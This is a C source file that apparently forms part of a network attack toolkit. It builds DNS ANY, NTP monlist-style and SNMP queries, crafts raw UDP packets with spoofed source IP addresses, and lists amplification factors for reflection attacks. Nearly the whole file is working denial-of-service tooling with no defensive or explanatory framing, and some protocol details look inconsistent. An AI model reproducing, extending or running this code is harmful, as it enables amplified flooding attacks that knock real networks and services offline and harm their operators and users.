#include "../include/engine.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <time.h>
#include <errno.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>

#define DNS_HEADER_LEN 12
#define NTP_HEADER_LEN 48
#define SNMP_MIN_LEN 30
#define MAX_PAYLOAD 1500

static char g_amp_err[256] = {0};

static unsigned int amp_rand(void)
{
    static unsigned int seed = 0;
    if (seed == 0) seed = (unsigned int)(time(NULL) ^ (uintptr_t)&seed);
    seed = seed * 1103515245U + 12345U;
    return seed;
}

static void dns_encode_name(unsigned char *dst, int *off, const char *name)
{
    if (!name || !*name) {
        dst[(*off)++] = 0;
        return;
    }

    const char *p = name;
    while (*p) {
        const char *dot = strchr(p, '.');
        int label_len = dot ? (int)(dot - p) : (int)strlen(p);
        if (label_len > 63) label_len = 63;
        dst[(*off)++] = (unsigned char)label_len;
        memcpy(dst + *off, p, (size_t)label_len);
        *off += label_len;
        p = dot ? dot + 1 : p + label_len;
    }
    dst[(*off)++] = 0;
}

EXPORT int amplification_init(int sock)
{
    if (sock < 0) {
        snprintf(g_amp_err, sizeof(g_amp_err), "invalid socket");
        return -1;
    }
    return 0;
}

EXPORT int build_dns_query(unsigned char *buf, int *len, uint16_t id, const char *domain)
{
    if (!buf || !len || !domain) {
        snprintf(g_amp_err, sizeof(g_amp_err), "invalid arguments");
        return -1;
    }

    memset(buf, 0, MAX_PAYLOAD);
    int off = 0;

    buf[off++] = (unsigned char)(id >> 8);
    buf[off++] = (unsigned char)(id & 0xFF);
    buf[off++] = 0x01; buf[off++] = 0x00;
    buf[off++] = 0x00; buf[off++] = 0x01;
    buf[off++] = 0x00; buf[off++] = 0x00;
    buf[off++] = 0x00; buf[off++] = 0x00;
    buf[off++] = 0x00; buf[off++] = 0x00;

    dns_encode_name(buf, &off, domain);

    buf[off++] = 0x00; buf[off++] = 0xFF;
    buf[off++] = 0x00; buf[off++] = 0x01;

    *len = off;
    return 0;
}

EXPORT int build_ntp_query(unsigned char *buf, int *len)
{
    if (!buf || !len) {
        snprintf(g_amp_err, sizeof(g_amp_err), "invalid arguments");
        return -1;
    }

    memset(buf, 0, NTP_HEADER_LEN);

    buf[0] = 0x17;
    buf[1] = 0x00;
    buf[2] = 0x03;
    buf[3] = 0x2A;

    *len = NTP_HEADER_LEN;
    return 0;
}

EXPORT int build_snmp_query(unsigned char *buf, int *len, const char *community)
{
    if (!buf || !len || !community) {
        snprintf(g_amp_err, sizeof(g_amp_err), "invalid arguments");
        return -1;
    }

    memset(buf, 0, MAX_PAYLOAD);
    int comm_len = (int)strlen(community);
    if (comm_len > 64) comm_len = 64;

    int off = 0;
    int seq_total_len_off;
    int seq_getbulk_len_off;
    int varbind_list_len_off;
    int varbind_len_off;

    buf[off++] = 0x30;
    seq_total_len_off = off;
    buf[off++] = 0x00;

    buf[off++] = 0x02; buf[off++] = 0x01; buf[off++] = 0x01;

    buf[off++] = 0x04; buf[off++] = (unsigned char)comm_len;
    memcpy(buf + off, community, (size_t)comm_len);
    off += comm_len;

    buf[off++] = 0xA1;
    seq_getbulk_len_off = off;
    buf[off++] = 0x00;

    buf[off++] = 0x02; buf[off++] = 0x01; buf[off++] = 0x00;
    buf[off++] = 0x02; buf[off++] = 0x01; buf[off++] = 0x00;
    buf[off++] = 0x02; buf[off++] = 0x01; buf[off++] = 0x00;

    buf[off++] = 0x30;
    varbind_list_len_off = off;
    buf[off++] = 0x00;

    buf[off++] = 0x30;
    varbind_len_off = off;
    buf[off++] = 0x00;

    buf[off++] = 0x06; buf[off++] = 0x08;
    buf[off++] = 0x2B; buf[off++] = 0x06; buf[off++] = 0x01;
    buf[off++] = 0x02; buf[off++] = 0x01; buf[off++] = 0x01;
    buf[off++] = 0x02; buf[off++] = 0x00;

    buf[off++] = 0x05; buf[off++] = 0x00;

    unsigned char varbind_len = (unsigned char)(off - varbind_len_off - 1);
    buf[varbind_len_off] = varbind_len;

    unsigned char varbind_list_len = (unsigned char)(off - varbind_list_len_off - 1);
    buf[varbind_list_len_off] = varbind_list_len;

    unsigned char seq_getbulk_len = (unsigned char)(off - seq_getbulk_len_off - 1);
    buf[seq_getbulk_len_off] = seq_getbulk_len;

    unsigned char seq_total_len = (unsigned char)(off - seq_total_len_off - 1);
    buf[seq_total_len_off] = seq_total_len;

    *len = off;
    return 0;
}

EXPORT int send_amplification(int sock, struct sockaddr_in *target, int amp_type, unsigned char *payload, int payload_len)
{
    if (!target || !payload || payload_len <= 0 || sock < 0) {
        snprintf(g_amp_err, sizeof(g_amp_err), "invalid arguments");
        return -1;
    }

    uint32_t spoof_ip = (uint32_t)(amp_rand() | (amp_rand() << 16));
    uint16_t sport = (uint16_t)(1024 + (amp_rand() % 64511));

    unsigned char pkt[MAX_PAYLOAD + sizeof(struct iphdr) + sizeof(struct udphdr)];
    memset(pkt, 0, sizeof(pkt));

    struct iphdr *ip = (struct iphdr *)pkt;
    struct udphdr *udp = (struct udphdr *)(pkt + sizeof(struct iphdr));
    unsigned char *data = pkt + sizeof(struct iphdr) + sizeof(struct udphdr);
    int data_len = payload_len;
    int total_len = sizeof(struct iphdr) + sizeof(struct udphdr) + data_len;

    ip->ihl = 5; ip->version = 4; ip->tot_len = htons((uint16_t)total_len);
    ip->id = htons((uint16_t)(amp_rand() & 0xFFFF));
    ip->frag_off = htons(0x4000);
    ip->ttl = 64; ip->protocol = IPPROTO_UDP;
    ip->saddr = spoof_ip;
    ip->daddr = target->sin_addr.s_addr;
    ip->check = 0;
    { uint32_t s = 0; uint16_t *p = (uint16_t *)ip; for (int i = 0; i < 10; i++) s += p[i]; while (s >> 16) s = (s & 0xFFFF) + (s >> 16); ip->check = ~s & 0xFFFF; }

    udp->source = htons(sport);
    udp->dest = target->sin_port;
    udp->len = htons((uint16_t)(sizeof(struct udphdr) + data_len));
    udp->check = 0;

    memcpy(data, payload, (size_t)data_len);

    int ret = (int)sendto(sock, pkt, (size_t)total_len, 0, (struct sockaddr *)target, sizeof(struct sockaddr_in));
    if (ret < 0) {
        snprintf(g_amp_err, sizeof(g_amp_err), "sendto: %s", strerror(errno));
        return -1;
    }
    return ret;
}

EXPORT int get_amplification_factor(int amp_type)
{
    switch (amp_type) {
    case METHOD_DNS_AMP:
        return 54;
    case METHOD_NTP_AMP:
        return 556;
    default:
        return 10;
    }
}
